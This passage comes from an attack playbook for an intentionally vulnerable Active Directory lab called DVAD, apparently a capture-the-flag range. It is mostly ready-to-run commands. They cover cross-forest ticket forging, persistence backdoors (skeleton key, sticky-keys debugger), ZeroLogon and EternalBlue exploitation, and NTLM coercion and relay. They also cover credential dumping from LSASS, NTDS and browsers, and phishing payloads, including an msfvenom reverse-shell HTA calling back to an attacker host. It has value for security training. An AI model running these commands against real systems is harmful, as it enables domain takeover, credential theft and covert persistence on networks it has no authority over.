impacket-ticketer -nthash <FINANCE_trustkey_nt> -domain-sid <CORP_SID> -domain corp.local \
                  -extra-sid <FIN_SID>-519 -spn 'krbtgt/finance.local' Administrator
export KRB5CCNAME=Administrator.ccache
impacket-getST -k -no-pass -spn cifs/dc01.finance.local -impersonate Administrator corp.local/Administrator
impacket-secretsdump -k -no-pass -just-dc finance.local/Administrator@dc01.finance.local
```

### Pattern R — Tree-root trust → root.corp

```bash
impacket-secretsdump -just-dc-user 'ROOT$' corp.local/Administrator@10.10.0.10
impacket-ticketer -nthash <ROOT_trustkey_nt> -domain-sid <CORP_SID> -domain corp.local \
                  -extra-sid <ROOT_SID>-519 -spn 'krbtgt/root.corp' Administrator
export KRB5CCNAME=Administrator.ccache
impacket-getST -k -no-pass -spn cifs/dc01.root.corp -impersonate Administrator corp.local/Administrator
impacket-secretsdump -k -no-pass -just-dc root.corp/Administrator@dc01.root.corp
```

### Pattern S — Foreign Security Principal hijack

```bash
nxc ldap 10.20.0.10 -u svc_x -p '<pw>' --query \
  '(objectClass=foreignSecurityPrincipal)' 'cn'
# BloodHound: run "Cross-Forest" query to confirm reachability
nxc ldap 10.10.0.10 -u alice -p 'DVADlab2024!' \
  --add-computer 'evil$' --groups 'CrossForestGroup'
impacket-psexec finance.local/alice:'DVADlab2024!'@10.20.0.10
```

### Pattern T — Cross-forest Kerberoast

```bash
impacket-getTGT corp.local/alice:'DVADlab2024!' -dc-ip 10.10.0.10
export KRB5CCNAME=alice.ccache
impacket-GetUserSPNs -k -no-pass -target-domain finance.local -dc-ip 10.20.0.10 \
                     -request corp.local/alice -outputfile xforest.kr
hashcat -m 13100 xforest.kr /usr/share/wordlists/rockyou.txt
```

### Pattern U — Cross-forest ADCS enrollment (PKINIT from foreign forest)

```bash
certipy find -u svc_x@finance.local -p '<pw>' -dc-ip 10.20.0.10 \
             -target ca01.corp.local -stdout -vulnerable
certipy req  -u svc_x@finance.local -p '<pw>' -target ca01.corp.local \
             -ca CORP-CA -template ESC1Template -upn 'Administrator@corp.local'
certipy auth -pfx administrator.pfx -dc-ip 10.10.0.10
```

### Pattern V — SID History injection (filtering bypass)

```bash
# From DA@corp.local (Windows host):
mimikatz # privilege::debug
mimikatz # sid::add /sid:S-1-5-21-FINANCE-519 /sam:alice

# alice's PAC now carries the foreign EA SID
impacket-getTGT corp.local/alice:'DVADlab2024!' -dc-ip 10.10.0.10
impacket-secretsdump -k -no-pass -just-dc finance.local/alice@dc01.finance.local
```

### Pattern W — Cross-forest unconstrained delegation

```bash
nxc ldap 10.10.0.10 -u alice -p 'DVADlab2024!' --trusted-for-delegation
# Coerce finance DC to authenticate to a host running svc_legacy (file01)
impacket-PetitPotam -u alice -p 'DVADlab2024!' -d corp.local file01.corp.local 10.20.0.10
# Dump tickets from LSASS on file01
mimikatz # sekurlsa::tickets /export
# Use the finance DC's TGT
KRB5CCNAME=dc01-finance.ccache impacket-secretsdump -k -no-pass -just-dc \
    finance.local/dc01\$@dc01.finance.local
```

### Pattern X — noPac across a trust

```bash
impacket-noPac.py finance.local/svc_x:'<pw>' -dc-ip 10.20.0.10 \
                  -dc-host dc01.finance.local -shell --impersonate Administrator
```

### Pattern Y — Cross-forest ADCS ESC11 (NTLM relay to ICPR-RPC)

```bash
impacket-PetitPotam -u svc_x -p '<pw>' -d finance.local 10.10.0.1 10.20.0.10
sudo impacket-ntlmrelayx -t 'rpc://ca01.corp.local' -rpc-mode ICPR \
                         -icpr-ca-name 'CORP-CA' -template 'Machine' -smb2support
```

### Pattern Z — Diamond + Sapphire (modern persistence variants)

```powershell
# Diamond — modify an existing TGT in-place
Rubeus.exe diamond /tgtdeleg /ticketuser:Administrator /ticketuserid:500 `
                   /groups:512,519 /krbkey:<krbtgt_aes256> /ptt

# Sapphire — forge with a live PAC pulled via S4U2Self
Rubeus.exe golden /aes256:<krbtgt_aes256> /user:Administrator /id:500 `
                  /domain:corp.local /sid:<CORP_SID> /sapphire /ptt
```

---

## 12. Persistence playbook

After Domain Admin, DVAD spec calls for persistence drops in every category. Pick at least one from each row.

| Tier | Technique | One-liner |
|---|---|---|
| Domain | Golden Ticket | `impacket-ticketer -nthash <krbtgt_nt> -domain-sid <CORP_SID> -domain corp.local Administrator` |
| Domain | Silver Ticket | `impacket-ticketer -nthash <svc_nt> -domain-sid <CORP_SID> -domain corp.local -spn cifs/file01.corp.local Administrator` |
| Domain | Skeleton key | `mimikatz # misc::skeleton` (every account auths with `mimikatz`) |
| Domain | DSRM backdoor | `Set-ItemProperty 'HKLM:\SYSTEM\CurrentControlSet\Control\Lsa' DsrmAdminLogonBehavior 2` |
| Domain | AdminSDHolder GenericAll | DVAD pre-creates this on `user2` → use it to re-add yourself |
| Object | Shadow Credentials | `certipy shadow auto -u alice@corp.local -p ... -account Administrator` |
| Object | RBCD | `impacket-rbcd -delegate-from 'evil$' -delegate-to 'dc01$' ...` |
| Cert | Golden Certificate | Steal CA cert + private key from ca01 → forge certs offline |
| Cert | CRL signing key abuse | `certipy ca -backup` |
| Host | Scheduled task | `schtasks /create /sc onlogon /tn DVAD /tr cmd.exe /ru SYSTEM` |
| Host | WMI event subscription | `Set-WmiEvent -Filter '...' -Consumer '...'` |
| Host | IFEO debugger on sethc.exe | `reg add 'HKLM\...\Image File Execution Options\sethc.exe' /v Debugger /d cmd.exe` |

---

## 13. IA-001..050 — full deep-dives

Each subsection covers a single Initial-Access ID with: precondition, attack command(s), expected output, what flag(s) it drops, follow-on patterns, and an EDR detection note.

### IA-001 — Anonymous SMB null session

**Precondition:** none (`RestrictAnonymous=0`, `RestrictAnonymousSAM=0` set lab-wide).
**Target:** `dc01.corp.local` (every DC).

```bash
nxc smb 10.10.0.10 -u '' -p '' --shares
nxc smb 10.10.0.10 -u '' -p '' --users
nxc smb 10.10.0.10 -u '' -p '' --groups
nxc smb 10.10.0.10 -u '' -p '' --pass-pol
enum4linux-ng -A 10.10.0.10
rpcclient -U '' -N 10.10.0.10 -c 'enumdomusers; enumdomgroups; querydominfo'
```

**Expected output:** list of ~120 domain users, weak password policy (4 chars min, no complexity).
**Flag dropped:** `FLAG-IA-001-InitialAccess.txt` on `C:\Flags\` (ACL=everyone).
**Follow-on:** IA-006 spray, IA-005 AS-REP roast.
**Detection:** Event 4625 with `Sub Status: 0xc0000064` (user unknown) — high volume from one source IP.

### IA-002 — Anonymous LDAP bind

**Precondition:** `dsHeuristics[7]=2` (anon LDAP read enabled).

```bash
ldapsearch -x -H ldap://10.10.0.10 -b 'DC=corp,DC=local' \
           '(objectClass=user)' sAMAccountName servicePrincipalName description \
           | grep -E '(sAMAccountName|servicePrincipalName|description):'
ldapsearch -x -H ldap://10.10.0.10 -b '' -s base 'objectclass=*'    # rootDSE
ldapsearch -x -H ldap://10.10.0.10 -b 'CN=Configuration,DC=corp,DC=local' \
           '(objectClass=nTDSDSA)'                                    # site/server topology
```

**Flag:** `FLAG-IA-002`. **Detection:** 4662 with no auth (anonymous bind).

### IA-003 — DNS AXFR

```bash
dig axfr corp.local @10.10.0.10
dig axfr eu.corp.local @10.10.0.11
dig axfr finance.local @10.20.0.10
dig axfr root.corp @10.30.0.10
dig axfr _msdcs.corp.local @10.10.0.10            # reveals every DC GUID + site
```

**Flag:** `FLAG-IA-003`. **Detection:** DNS Server Event 6004.

### IA-004 — Kerberos user enumeration

```bash
kerbrute userenum -d corp.local --dc 10.10.0.10 \
         /usr/share/seclists/Usernames/Names/names.txt -o kerb_valid.txt
# Distinguishes valid vs invalid users by KDC reply (PRINCIPAL_UNKNOWN vs others).
```

**Flag:** `FLAG-IA-004`. **Detection:** Event 4768 with `Pre-Auth Type: 0` flood.

### IA-005 — AS-REP roasting

**Precondition:** at least one user with `DoNotRequirePreAuth` (DVAD ships `svc_nopreauth`, plus 3 others).

```bash
impacket-GetNPUsers corp.local/ -dc-ip 10.10.0.10 -no-pass \
                    -usersfile users.txt -format hashcat -outputfile asrep.kr
hashcat -m 18200 asrep.kr /usr/share/wordlists/rockyou.txt --force
# expected cracks: svc_nopreauth : Welcome1, svc_legacy : Summer2023!
```

**Flag:** `FLAG-IA-005`. **Detection:** 4768 with `Pre-Auth Type: 0` and etype 0x17.

### IA-006 — Password spray (DVADlab2024!)

```bash
# Pull users via IA-001 RID brute first
nxc smb 10.10.0.10 -u '' -p '' --rid-brute 20000 | \
    grep '(SidTypeUser)' | awk -F'\\\\' '{print $2}' | awk '{print $1}' > users.txt

# Spray — DVAD reuses the lab password
nxc smb 10.10.0.10 -u users.txt -p 'DVADlab2024!' --continue-on-success
nxc smb 10.10.0.10 -u users.txt -p 'Summer2024!'  --continue-on-success
nxc smb 10.10.0.10 -u users.txt -p 'Welcome1'     --continue-on-success
nxc smb 10.10.0.10 -u users.txt -p 'Password1'    --continue-on-success
```

**Flag:** `FLAG-IA-006`. **Detection:** 4625 / 4771 burst from same source.

### IA-007 — Anonymous SMB share read (file01)

```bash
smbclient -L //10.10.0.13 -N
smbclient //10.10.0.13/Public -N -c 'recurse on; ls'
smbclient //10.10.0.13/Public -N -c 'mget *' < /dev/null    # bulk pull
```

**Reads expected:** `creds.txt` (stub), `notes/backup_paths.txt` (hints toward Backup$).
**Flag:** `FLAG-IA-007`.

### IA-008 — Anonymous FTP (file01)

```bash
curl ftp://10.10.0.13/
curl -O ftp://10.10.0.13/pub/creds_backup.zip
ftp -a 10.10.0.13                                  # anonymous login allowed
```

**Flag:** `FLAG-IA-008`.

### IA-009 — Anonymous NFS export

```bash
showmount -e 10.10.0.13
sudo mount -t nfs -o vers=3 10.10.0.13:/DVAD_NFS /mnt/nfs
ls -la /mnt/nfs                                    # writes drop as UID 65534
# Drop a SUID binary to escalate on a host that mounts the same share
sudo cp /bin/bash /mnt/nfs/rootbash && sudo chmod 4755 /mnt/nfs/rootbash
```

**Flag:** `FLAG-IA-009`.

### IA-010 — SNMP public/private community

```bash
snmpwalk -v2c -c public  10.10.0.13 1.3.6.1.2.1.1
snmpwalk -v2c -c public  10.10.0.13 1.3.6.1.4.1.77.1.2.25   # WindowsAccounts MIB
snmpwalk -v2c -c private 10.10.0.13 1.3.6.1.4.1.77.1.2.27   # WindowsServices MIB
# Writable community (lab-only)
snmpset  -v2c -c private 10.10.0.13 1.3.6.1.4.1.77.1.2.25.1.1.1 s 'pwned'
```

**Flag:** `FLAG-IA-010`.

### IA-011 — MSSQL `sa` weak password

```bash
impacket-mssqlclient 'sa:SqlServer2025!@10.10.0.14' -windows-auth
# in the shell:
SQL> enable_xp_cmdshell
SQL> xp_cmdshell whoami /priv
SQL> xp_cmdshell powershell -enc <b64_revshell>
```

**Flag:** `FLAG-IA-011`. **Follow-on:** PE-021 SeImpersonate → SYSTEM.

### IA-012 — WinRM 5985 with default cred

```bash
evil-winrm -i 10.10.0.100 -u Administrator -p 'DVADlab2024!'
# HTTPS variant (self-signed)
evil-winrm -i 10.10.0.100 -u Administrator -p 'DVADlab2024!' -S
```

**Flag:** `FLAG-IA-012`.

### IA-013 — PetitPotam coercion → ESC8

```bash
# Terminal 1 — relay sink
sudo impacket-ntlmrelayx -t http://10.10.0.12/certsrv/certfnsh.asp \
                         --adcs --template DomainController -smb2support
# Terminal 2 — coerce DC$ to authenticate
impacket-PetitPotam -u alice -p 'DVADlab2024!' -d corp.local 10.10.0.1 10.10.0.10
# Result: dc01$ cert (b64) → certipy auth → krbtgt NT hash
```

**Flag:** `FLAG-IA-013`. **Detection:** 5145 `\PIPE\efsrpc`.

### IA-014 — PrinterBug (`MS-RPRN`) coercion

```bash
python3 printerbug.py 'corp.local/alice:DVADlab2024!'@10.10.0.10 10.10.0.1
# Use with ntlmrelayx pointing at ldaps://dc01 --delegate-access
```

**Flag:** `FLAG-IA-014`.

### IA-015 — EternalBlue (MS17-010) on file01

```bash
nmap --script smb-vuln-ms17-010 -p445 10.10.0.13
msfconsole -q -x 'use exploit/windows/smb/ms17_010_psexec; \
                  set RHOSTS 10.10.0.13; set LHOST 10.10.0.1; run'
```

**Flag:** `FLAG-IA-015`.

### IA-016 — ZeroLogon

```bash
python3 zerologon_tester.py DC01 10.10.0.10                # detect
python3 set_empty_pw.py     DC01 10.10.0.10                # exploit
impacket-secretsdump -no-pass -just-dc corp.local/dc01\$@10.10.0.10
# CRITICAL — restore
python3 reinstall_original_pw.py DC01 10.10.0.10 <hex_pw>
```

**Flag:** `FLAG-IA-016`. **Detection:** Netlogon Event 5805.

### IA-017 — Spooler bug from member host

```bash
# From file01 as svc_user (after IA-008 → spray cracked svc_user)
python3 SpoolSample.py -u svc_user -p Welcome1 \
        -d corp.local -t 10.10.0.10 -targ 10.10.0.1
```

**Flag:** `FLAG-IA-017`.

### IA-018 — RDP brute (NLA off on ws01)

```bash
hydra -L users.txt -p 'DVADlab2024!' rdp://10.10.0.100 -t 1
xfreerdp /v:10.10.0.100 /u:alice /p:'DVADlab2024!' +sec-nla
```

**Flag:** `FLAG-IA-018`.

### IA-019 — `.library-ms` phishing (CVE-2025-24071)

```bash
cat > 'Salaries_Q3.library-ms' <<'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<searchConnectorDescriptionList>
<searchConnectorDescription>
<simpleLocation><url>\\10.10.0.1\share</url></simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
EOF
zip 'Salaries_Q3.zip' 'Salaries_Q3.library-ms'
sudo responder -I <iface> -wv
# Mail/drop the zip — victim previewing it triggers NTLM leak to your Responder.
```

**Flag:** `FLAG-IA-019`.

### IA-020 — HTA / VBA phishing

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.0.1 LPORT=4444 \
         -f hta-psh -o stage1.hta
python3 -m http.server 8080
# Deliver via email: "https://10.10.0.1:8080/stage1.hta"
```

**Flag:** `FLAG-IA-020`.

### IA-021 — LNK with WebDAV auth coerce

```bash
# Create a .lnk pointing at \\10.10.0.1@SSL@8443\share\x.dll
python3 lnkbomb.py --out evil.lnk --target '\\10.10.0.1@SSL@8443\foo\bar'
# Coordinate with Responder or a fake WebDAV serving an authentication challenge
```

**Flag:** `FLAG-IA-021`.

### IA-022 — mitm6 + WPAD

```bash
sudo mitm6 -d corp.local -i <iface> &
sudo impacket-ntlmrelayx -6 -t ldaps://dc01.corp.local \
                         -wh wpad.corp.local \
                         --delegate-access --no-smb-server
```

**Flag:** `FLAG-IA-022`.

### IA-023 — LLMNR/NBT-NS poisoning (Responder)

```bash
sudo responder -I <iface> -wrf
# Wait for a victim typo (\\fileserver instead of \\file01) — net-NTLMv2 captured.
hashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt
```

**Flag:** `FLAG-IA-023`.

### IA-024 — IPv6 RA + DNS hijack (mitm6 only)

```bash
sudo mitm6 -d corp.local -i <iface> --ignore-nofqdn
# Host falls back to attacker-supplied DNS → bookmark hijack → captive auth
```

**Flag:** `FLAG-IA-024`.

### IA-025 — IIS WebDAV PROPFIND + PUT

```bash
curl -X PROPFIND http://10.10.0.12/ -H 'Depth: 1'
curl -X OPTIONS  http://10.10.0.12/
curl -T shell.aspx 'http://10.10.0.12/uploads/shell.aspx;.txt'
curl 'http://10.10.0.12/uploads/shell.aspx?cmd=whoami'
```

**Flag:** `FLAG-IA-025`.

### IA-026 — Tomcat manager default cred (operator-extended)

```bash
hydra -L tomcat-users.txt -P tomcat-passwords.txt \
      -e ns 10.10.0.13 http-get /manager/html
curl -u tomcat:s3cret -T evil.war 'http://10.10.0.13:8080/manager/text/deploy?path=/x'
curl 'http://10.10.0.13:8080/x/cmd.jsp?cmd=whoami'
```

**Flag:** `FLAG-IA-026`.

### IA-027 — Jenkins default (operator-extended)

```bash
curl http://10.10.0.13:8080/script
# CSRF token + Groovy:
curl -X POST 'http://10.10.0.13:8080/script' --data-urlencode \
     'script=println "id".execute().text'
```

**Flag:** `FLAG-IA-027`.

### IA-028 — Confluence OGNL (operator-extended)

```bash
curl 'http://10.10.0.13:8090/%24%7B%40java.lang.Runtime%40getRuntime%28%29.exec%28%22id%22%29%7D/'
```

**Flag:** `FLAG-IA-028`.

### IA-029 — SCCM PXE NAA harvest

```bash
python3 PXEThief.py -d corp.local --target ws-pxe.corp.local --interface <iface>
python3 pxe_thief_decrypt.py policy.xml
```

**Flag:** `FLAG-IA-029`.

### IA-030 — USB / autorun drop

```bash
# Build LNK + payload combo; copy to FAT32 USB.
# In DVAD ws01 simulates a kiosk — autorun.inf is honored.
```

**Flag:** `FLAG-IA-030`.

### IA-031 — Web app SSRF → metadata service

(For VPS deployments only; cloud metadata IP `169.254.169.254` is unreachable in default DVAD.)

**Flag:** `FLAG-IA-031`.

### IA-032 — SSH password-auth file01

```bash
hydra -L users.txt -p 'DVADlab2024!' ssh://10.10.0.13 -t 4
# Or with known creds (svc_legacy : Summer2023! after AS-REP):
ssh svc_legacy@10.10.0.13
```

**Flag:** `FLAG-IA-032`.

### IA-033 — Telnet on file01

```bash
nc -v 10.10.0.13 23
# Telnet svc keyboard-only — accept any user/DVADlab2024!
```

**Flag:** `FLAG-IA-033`.

### IA-034..IA-050 — ENUM-surface entries

These are zero-cred footholds that piggy-back on the ENUM surface enabled lab-wide. Quick reference:

| ID | Surface | One-liner |
|---|---|---|
| IA-034 | UPnP/SSDP | `gssdp-discover -t ssdp:all -n 10.10.0.0/24` |
| IA-035 | mDNS/Bonjour | `avahi-browse -ar` |
| IA-036 | RDP NLA disabled | `xfreerdp /v:10.10.0.100 +sec-nla` |
| IA-037 | WS-Discovery | `wsdd-discover.py -i <iface>` |
| IA-038 | NetBIOS name svc | `nmblookup -A 10.10.0.13` |
| IA-039 | DCE/RPC endpoint dump | `rpcdump.py 10.10.0.10` |
| IA-040 | MS-RPC anonymous | `impacket-rpcdump -port 135 10.10.0.10` |
| IA-041 | SOCKS open on file01 | `proxychains4 nxc smb 10.10.0.10 -u alice -p DVADlab2024!` |
| IA-042 | NTP MON_GETLIST | `ntpq -c monlist 10.10.0.10` |
| IA-043 | mDNS reflector | `dig +short -p 5353 -t any _services._dns-sd._udp.local @10.10.0.13` |
| IA-044 | Quic/HTTP3 default | `curl --http3 -k https://10.10.0.12` |
| IA-045 | IPMI 623/udp | `ipmiscan 10.10.0.0/24` (host-side BMC, lab note only) |
| IA-046 | KMS port 1688 | `nmap -p1688 10.10.0.10` |
| IA-047 | Schannel SSL2/3 | `sslscan 10.10.0.10:636` |
| IA-048 | Certificate transparency leak | (operator-extended) |
| IA-049 | Anonymous WebDAV PUT | `curl -T x http://10.10.0.12/dav/x` |
| IA-050 | SNMPv3 default ctx | `snmpwalk -v3 -l noAuthNoPriv -u default 10.10.0.13` |

---

## 14. ENUM-001..080 — full deep-dives

Once you have any authenticated identity (anon, low-priv, machine, ticket), DVAD's ENUM surface is the largest in any public AD lab. The catalog below groups all 80 IDs by surface; each group has copy-paste commands.

### ENUM-001..010 — AD object inventory

```bash
# Users + UAC flags
nxc ldap 10.10.0.10 -u alice -p 'DVADlab2024!' --users
# Computers
nxc ldap 10.10.0.10 -u alice -p 'DVADlab2024!' --computers
# Groups + membership
nxc ldap 10.10.0.10 -u alice -p 'DVADlab2024!' --groups
# OU tree + GPO links
ldapsearch -x -H ldap://10.10.0.10 -D 'alice@corp.local' -w 'DVADlab2024!' \
           -b 'DC=corp,DC=local' '(objectCategory=organizationalUnit)' name
# GPO list
ldapsearch -x -H ldap://10.10.0.10 -D 'alice@corp.local' -w 'DVADlab2024!' \
           -b 'CN=Policies,CN=System,DC=corp,DC=local' \
           '(objectClass=groupPolicyContainer)' displayName gPCFileSysPath
# Sites and subnets
ldapsearch -x -H ldap://10.10.0.10 -D 'alice@corp.local' -w 'DVADlab2024!' \
           -b 'CN=Sites,CN=Configuration,DC=corp,DC=local' \
           '(objectClass=site)' name
# Trusts
nxc ldap 10.10.0.10 -u alice -p 'DVADlab2024!' -M enum_trusts
ldapsearch -x -H ldap://10.10.0.10 -D 'alice@corp.local' -w 'DVADlab2024!' \
           -b 'CN=System,DC=corp,DC=local' '(objectClass=trustedDomain)' \
           trustPartner trustDirection trustType trustAttributes
```

### ENUM-011..020 — SPN / Kerberoast / AS-REP discovery

```bash
nxc ldap 10.10.0.10 -u alice -p 'DVADlab2024!' --kerberoasting all
nxc ldap 10.10.0.10 -u alice -p 'DVADlab2024!' --asreproast all
nxc ldap 10.10.0.10 -u alice -p 'DVADlab2024!' --trusted-for-delegation
nxc ldap 10.10.0.10 -u alice -p 'DVADlab2024!' --password-not-required
nxc ldap 10.10.0.10 -u alice -p 'DVADlab2024!' --admin-count
nxc ldap 10.10.0.10 -u alice -p 'DVADlab2024!' --gmsa
nxc ldap 10.10.0.10 -u alice -p 'DVADlab2024!' --gmsa-convert-id
```

### ENUM-021..030 — Named-pipe / RPC surface

```bash
rpcdump.py @10.10.0.10
rpcdump.py @10.10.0.11
rpcdump.py @10.10.0.13
# Filter for the high-value pipes:
rpcdump.py @10.10.0.10 | grep -iE 'efsrpc|spoolss|drsuapi|samr|lsarpc|netlogon|wkssvc'
# Probe MS-EFSR (PetitPotam)
impacket-PetitPotam -u alice -p 'DVADlab2024!' -d corp.local 10.10.0.1 10.10.0.10
# Probe MS-RPRN (PrinterBug)
python3 rprn.py -u alice -p 'DVADlab2024!' -d corp.local 10.10.0.10
# Probe MS-DFSNM (DFSCoerce)
python3 dfscoerce.py -d corp.local -u alice -p 'DVADlab2024!' 10.10.0.1 10.10.0.10
```

### ENUM-031..040 — SMB / NetBIOS / WebDAV

```bash
nxc smb 10.10.0.10 --shares -u alice -p 'DVADlab2024!'
nxc smb 10.10.0.10 --pass-pol -u alice -p 'DVADlab2024!'
nxc smb 10.10.0.10 --loggedon-users -u alice -p 'DVADlab2024!'
nxc smb 10.10.0.10 --sessions -u alice -p 'DVADlab2024!'
nxc smb 10.10.0.0/24 --rid-brute 20000 -u '' -p ''
nxc smb 10.10.0.10 --signing -u alice -p 'DVADlab2024!'
nxc smb 10.10.0.0/24 -u alice -p 'DVADlab2024!' --shares --filter-shares READ,WRITE
smbmap -H 10.10.0.10 -u alice -p 'DVADlab2024!' -R --depth 5
```

### ENUM-041..050 — Certificate / ADCS surface

```bash
certipy find -u alice@corp.local -p 'DVADlab2024!' -dc-ip 10.10.0.10 -stdout
certipy find -u alice@corp.local -p 'DVADlab2024!' -dc-ip 10.10.0.10 -stdout -vulnerable
certipy find -u alice@corp.local -p 'DVADlab2024!' -dc-ip 10.10.0.10 -stdout -enabled
# Web enrol probe
for p in /certsrv/ /certsrv/certfnsh.asp /certsrv/certrqxt.asp /CertEnroll/ /ADPolicyProvider_CEP_Kerberos/service.svc/mex; do
  curl -ks -o /dev/null -w "%{http_code} $p\n" "http://10.10.0.12$p"
done
```

### ENUM-051..060 — Group Policy / SYSVOL

```bash
# Pull every GPP file
smbclient //10.10.0.10/SYSVOL -U 'alice%DVADlab2024!' -c 'recurse on; prompt off; mget *'
grep -r 'cpassword' SYSVOL/
gpp-decrypt '<cpassword_b64>'
# Group Policy Object inventory
nxc ldap 10.10.0.10 -u alice -p 'DVADlab2024!' -M gpoenum
```

### ENUM-061..070 — DNS / service / port enumeration

```bash
nslookup -type=SRV _ldap._tcp.dc._msdcs.corp.local 10.10.0.10
nslookup -type=SRV _kerberos._tcp.corp.local 10.10.0.10
dig +noall +answer _ldap._tcp.corp.local @10.10.0.10
dig +noall +answer _gc._tcp.corp.local    @10.10.0.10

# Fast TCP sweep over the lab
rustscan -a 10.10.0.0/24 --ulimit 5000 -- -sV -sC
nmap -p- -sV -sC --min-rate 1500 10.10.0.10
```

### ENUM-071..080 — MSSQL, IIS, NFS, FTP, NTP, SNMP, Quic, mDNS, UPnP, WS-Discovery

```bash
# MSSQL
nxc mssql 10.10.0.14 -u alice -p 'DVADlab2024!' --query 'SELECT name FROM sys.databases'
nxc mssql 10.10.0.14 -u alice -p 'DVADlab2024!' -M mssql_priv
# IIS app discovery
whatweb http://10.10.0.12
# NFS exports
showmount -e 10.10.0.13
# FTP anon listing
curl ftp://10.10.0.13/
# NTP / MON_GETLIST
ntpq -c monlist 10.10.0.10
# SNMP MIBs
snmpwalk -v2c -c public 10.10.0.13 1.3.6.1.4.1.77.1.2.25
# Quic
nmap -p443 --script http3-info 10.10.0.12
# mDNS
avahi-browse -ar
# UPnP
gssdp-discover -t ssdp:all -n 10.10.0.0/24
# WS-Discovery
wsdd-discover.py -i <iface>
```

Per-ENUM-ID flag drops are in `ansible/roles/flag_factory/vars/main.yml`. Each entry's `host` field tells you which VM holds the flag for that ENUM ID.

---

## 15. CRED-001..065 — credential access catalog

Each ID maps to a concrete extraction or theft technique. The lab pre-stages every primitive — your job is to demonstrate it.

### Kerberos cred access

| ID | Technique | One-liner |
|---|---|---|
| CRED-001 | Kerberoast all SPNs | `impacket-GetUserSPNs corp.local/alice:'DVADlab2024!' -dc-ip 10.10.0.10 -request -outputfile spns.kr` |
| CRED-002 | Targeted Kerberoast | `impacket-GetUserSPNs ... -request-user svc_web` |
| CRED-003 | AS-REP roast | `impacket-GetNPUsers corp.local/ -no-pass -usersfile users.txt -dc-ip 10.10.0.10` |
| CRED-004 | RC4 downgrade for hardened SPN | `impacket-GetUserSPNs ... -request -hashes :<NT>` |
| CRED-005 | krbtgt extraction via DCSync | `impacket-secretsdump -just-dc-user krbtgt corp.local/sync_user:'DVADlab2024!'@10.10.0.10` |
| CRED-006 | Trust account hash | `impacket-secretsdump -just-dc-user 'FINANCE$' corp.local/Administrator@10.10.0.10` |
| CRED-007 | Service account hash via DCSync | `impacket-secretsdump -just-dc-user svc_web corp.local/Administrator@10.10.0.10` |
| CRED-008 | TGT export from ccache | `KRB5CCNAME=alice.ccache klist; cp $KRB5CCNAME .` |
| CRED-009 | Diamond ticket | `Rubeus.exe diamond /tgtdeleg /ticketuser:Administrator /ticketuserid:500 /groups:512` |
| CRED-010 | Sapphire ticket | `Rubeus.exe golden /sapphire /aes256:<krbtgt_aes256> /user:Administrator /id:500` |

### LSASS / SAM / NTDS dumping

| ID | Technique | One-liner |
|---|---|---|
| CRED-011 | comsvcs.dll MiniDump | `rundll32 C:\Windows\System32\comsvcs.dll, MiniDump <lsass_pid> C:\Users\Public\l.dmp full` |
| CRED-012 | Procdump | `procdump64 -accepteula -ma lsass.exe lsass.dmp` |
| CRED-013 | NanoDump | `nanodump.exe -w lsass.dmp` |
| CRED-014 | Pypykatz offline | `pypykatz lsa minidump lsass.dmp` |
| CRED-015 | Mimikatz `sekurlsa::logonpasswords` | (interactive) |
| CRED-016 | SAM/SYSTEM offline | `reg save HKLM\SAM sam; reg save HKLM\SYSTEM sys` |
| CRED-017 | impacket-secretsdump local | `impacket-secretsdump -sam sam -system sys LOCAL` |
| CRED-018 | NTDS.dit + SYSTEM | `vssadmin create shadow /for=C:; copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy*\Windows\NTDS\NTDS.dit .` |
| CRED-019 | DSInternals offline NTDS | `Get-ADDBAccount -All -DBPath ntds.dit -BootKey <boot_key>` |
| CRED-020 | DPAPI master-key dump | `impacket-dpapi masterkey -file <master_key> -password 'DVADlab2024!'` |

### DPAPI / browser / Cred Manager

| ID | Technique | One-liner |
|---|---|---|
| CRED-021 | DPAPI Cred Manager | `mimikatz # dpapi::cred /in:%LOCALAPPDATA%\Microsoft\Credentials\<guid>` |
| CRED-022 | Chrome saved logins | `python3 chrome_dec.py "C:\Users\alice\AppData\Local\Google\Chrome\User Data\Default\Login Data"` |
| CRED-023 | Edge / FF cookies | `firefox_decrypt.py ~/.mozilla` |
| CRED-024 | Windows Vault | `cmdkey /list; vaultcmd /list` |
| CRED-025 | RDP saved password | `mimikatz # dpapi::rdp /in:%LOCALAPPDATA%\Microsoft\Credentials\*` |

### File-share / SYSVOL / GPP

| ID | Technique | One-liner |
|---|---|---|
| CRED-026 | SYSVOL GPP cpassword | `grep -r 'cpassword' SYSVOL/ && gpp-decrypt '<b64>'` |
| CRED-027 | Group preferences (printers, drives, schedtasks) | `find SYSVOL -name 'Groups.xml' -o -name 'Drives.xml'` |
| CRED-028 | Backup share creds | `smbclient //10.10.0.13/Backup\$ -U 'backup_op%...'` |
| CRED-029 | Public share secrets | `smbclient //10.10.0.13/Public -N -c 'mget *'` |
| CRED-030 | KeePass DB harvest | `keepass2john Database.kdbx` |

### Coercion + relay outputs

| ID | Technique | One-liner |
|---|---|---|
| CRED-031 | PetitPotam → ESC8 cert | (Pattern C) |
| CRED-032 | DFSCoerce → ESC8 | `python3 dfscoerce.py -d corp.local -u alice -p ... 10.10.0.1 10.10.0.10` |
| CRED-033 | PrinterBug → relay LDAP | `python3 printerbug.py ... && impacket-ntlmrelayx -t ldaps://dc01 --delegate-access` |
| CRED-034 | mitm6 → relay LDAPS | (Pattern K) |
| CRED-035 | LLMNR NTLMv2 capture | `responder -I <iface> -wv` |
| CRED-036 | WPAD auth coerce | `responder -wv -wf` |

### Hash relay / pass-the-hash / over-PTH

| ID | Technique | One-liner |
|---|---|---|
| CRED-037 | NTLM relay SMB→SMB | `impacket-ntlmrelayx -t smb://10.10.0.13 -smb2support` |
| CRED-038 | NTLM relay SMB→LDAP | `impacket-ntlmrelayx -t ldaps://dc01 --delegate-access` |
| CRED-039 | NTLM relay → ICPR (ESC11) | `impacket-ntlmrelayx -t rpc://ca01 -rpc-mode ICPR -icpr-ca-name CORP-CA` |
| CRED-040 | PTH SMB | `nxc smb 10.10.0.13 -u alice -H <NTLM>` |
| CRED-041 | PTH WinRM | `evil-winrm -i 10.10.0.10 -u alice -H <NTLM>` |
| CRED-042 | Pass-the-ticket | `KRB5CCNAME=admin.ccache impacket-psexec -k -no-pass dc01.corp.local` |
